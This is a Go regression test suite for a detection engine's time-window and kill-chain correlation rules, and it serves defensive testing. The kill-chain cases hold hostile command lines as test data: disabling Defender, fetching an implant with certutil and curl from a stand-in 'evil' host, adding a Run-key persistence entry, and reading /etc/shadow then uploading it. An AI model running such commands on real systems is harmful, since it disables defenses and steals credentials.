package rules

// DB-engine CORRELATION coverage regression suite.
//
// migration_coverage_test.go locks the single-event (sigma + plain behavioral)
// shipped rules. This file locks the OTHER half of the detection-server engine:
// the SequenceEngine time-window correlation rules — brute force, port scan,
// discovery burst, ransomware mass-encryption, and the multi-stage kill chains.
//
// Like the single-event suite it loads the ACTUAL shipped rules from the
// migration SQL (extractMigrationRules) into a real SequenceEngine and drives
// representative event bursts, so the correlation rules are regression-locked
// against the shipped bytes with zero drift — replacing the pre-existing tests
// that drove synthetic inline rules (rule_engine_test.go / correlation_*_test.go).
//
// Note: these correlation rules ship largely via the idempotent INSERT…SELECT
// form (migrations 266/267/274/283-312), which the extractor only learned to
// parse when this suite was added — before that they were invisible to the
// harness entirely.

import (
	"fmt"
	"strings"
	"testing"
)

// loadSequenceEngine builds a SequenceEngine populated with every enabled
// behavioral (window/threshold or staged) rule shipped in the migrations.
func loadSequenceEngine(t *testing.T) *SequenceEngine {
	t.Helper()
	rules, err := extractMigrationRules()
	if err != nil {
		t.Fatalf("extract migration rules: %v", err)
	}
	var behavioral []*DetectionRule
	for _, r := range rules {
		if r.Enabled && r.Type == "behavioral" {
			behavioral = append(behavioral, r)
		}
	}
	se := NewSequenceEngine()
	se.LoadRules(behavioral)
	return se
}

// firedTechnique reports whether any match in ms carries the technique tag.
func firedTechnique(ms []*RuleMatch, technique string) bool {
	for _, m := range ms {
		for _, tag := range m.MITRETags {
			if tag == technique {
				return true
			}
		}
	}
	return false
}

// drive feeds a slice of (eventType, event) observations for one agent and
// returns whether the target technique fired on ANY of them.
func drive(se *SequenceEngine, agentID, technique string, obs []seqObs) bool {
	for _, o := range obs {
		if firedTechnique(se.Observe(agentID, o.etype, o.event), technique) {
			return true
		}
	}
	return false
}

type seqObs struct {
	etype string
	event map[string]interface{}
}

// repeatObs builds n observations of eventType with the event produced by mk(i).
func repeatObs(etype string, n int, mk func(i int) map[string]interface{}) []seqObs {
	out := make([]seqObs, n)
	for i := 0; i < n; i++ {
		out[i] = seqObs{etype, mk(i)}
	}
	return out
}

// ─── Threshold-mode correlation rules (migration 004 + SELECT-form) ──────────

func TestMigrationSequenceCoverage_Threshold(t *testing.T) {
	cases := []struct {
		name      string
		technique string
		obs       []seqObs
	}{
		// The event shapes below are the CORRECTED ones. Migrations 288/291 rewrote
		// these rules because the originals referenced fields the flat map never
		// carries (auth eventName, camelCase dstPort/dstIp/srcIp) and were therefore
		// permanently inert — 291's own comment records ever_fired=0 for all three.
		// This suite used to drive the ORIGINAL field names and pass, because the
		// extractor only read INSERT statements and never applied the fixes. It was
		// asserting that the broken rule fired on broken input.
		{"failed-logon brute force", "T1110.001",
			// migration 288: event_type auth, field action, value failed,
			// group_by username, threshold 8.
			repeatObs("auth", 8, func(i int) map[string]interface{} {
				return map[string]interface{}{"action": "failed", "username": "administrator"}
			})},
		{"port scan", "T1046",
			// migration 291: distinct dst_port per src_ip, threshold 15.
			repeatObs("network", 16, func(i int) map[string]interface{} {
				return map[string]interface{}{"src_ip": "10.0.0.9", "dst_port": fmt.Sprintf("%d", 1000+i)}
			})},
		{"internal recon / lateral sweep", "T1018",
			// migration 291: distinct dst_ip per agent, threshold 20.
			repeatObs("network", 21, func(i int) map[string]interface{} {
				return map[string]interface{}{"dst_ip": fmt.Sprintf("10.0.1.%d", i)}
			})},
		{"mass process spawn", "T1055",
			// migration 241 raised the threshold 30 → 100 (with a 300s cooldown)
			// because the procFS initial snapshot alone cleared the old one.
			repeatObs("process", 101, func(i int) map[string]interface{} {
				return map[string]interface{}{"process_name": fmt.Sprintf("child%d.exe", i)}
			})},
		{"DNS query flood", "T1071.004",
			repeatObs("dns", 101, func(i int) map[string]interface{} {
				return map[string]interface{}{"query": "beacon.example.com"}
			})},
		{"DNS distinct domains (DGA/C2)", "T1568",
			repeatObs("dns", 51, func(i int) map[string]interface{} {
				return map[string]interface{}{"query": fmt.Sprintf("d%d.evil.example", i)}
			})},
		{"discovery burst", "T1033",
			[]seqObs{
				{"process", map[string]interface{}{"processName": "whoami.exe"}},
				{"process", map[string]interface{}{"processName": "tasklist.exe"}},
				{"process", map[string]interface{}{"processName": "systeminfo.exe"}},
				{"process", map[string]interface{}{"processName": "ipconfig.exe"}},
				{"process", map[string]interface{}{"processName": "net.exe"}},
			}},
		{"ransomware mass encryption", "T1486",
			repeatObs("file", 21, func(i int) map[string]interface{} {
				return map[string]interface{}{"path": fmt.Sprintf("/home/v/doc%d.docx.locked", i)}
			})},
	}

	for _, c := range cases {
		t.Run(c.technique+"/"+strings.ReplaceAll(c.name, " ", "_"), func(t *testing.T) {
			se := loadSequenceEngine(t)
			// Unique agent per scenario keeps group-key buffers isolated.
			if !drive(se, "seq-"+c.technique, c.technique, c.obs) {
				t.Fatalf("correlation rule for %s (%s) did not fire on a %d-event burst",
					c.technique, c.name, len(c.obs))
			}
		})
	}
}

// ─── Staged multi-stage kill-chain rules (migrations 274/290/304/306) ────────

func TestMigrationSequenceCoverage_KillChains(t *testing.T) {
	proc := func(cmd string) seqObs {
		return seqObs{"process", map[string]interface{}{"commandLine": cmd, "processName": "x"}}
	}

	cases := []struct {
		name      string
		technique string
		stages    []seqObs
	}{
		// Defense evasion → payload retrieval (T1562.001 → T1105)
		{"defense-evasion→payload", "T1105", []seqObs{
			proc(`powershell Set-MpPreference -DisableRealtimeMonitoring $true`),
			proc(`certutil -urlcache -f http://evil/p.exe p.exe`),
		}},
		// Execution → persistence (T1059 → T1547.001 / T1053.005)
		{"execution→persistence", "T1547.001", []seqObs{
			proc(`powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A`),
			proc(`reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v evil /d c:\e.exe`),
		}},
		// Linux malware drop (T1105 → T1222.002)
		{"linux-malware-drop", "T1222.002", []seqObs{
			proc(`curl -o /tmp/implant http://evil/implant`),
			proc(`chmod +x /tmp/implant`),
		}},
		// Linux credential theft → exfil (T1003.008 → T1041)
		{"linux-cred-theft→exfil", "T1041", []seqObs{
			proc(`cat /etc/shadow`),
			proc(`curl -T /tmp/shadow http://evil/upload`),
		}},
	}

	for _, c := range cases {
		t.Run(c.technique+"/"+c.name, func(t *testing.T) {
			se := loadSequenceEngine(t)
			if !drive(se, "kc-"+c.name, c.technique, c.stages) {
				t.Fatalf("kill-chain rule for %s (%s) did not fire on its staged sequence", c.technique, c.name)
			}
		})
	}
}
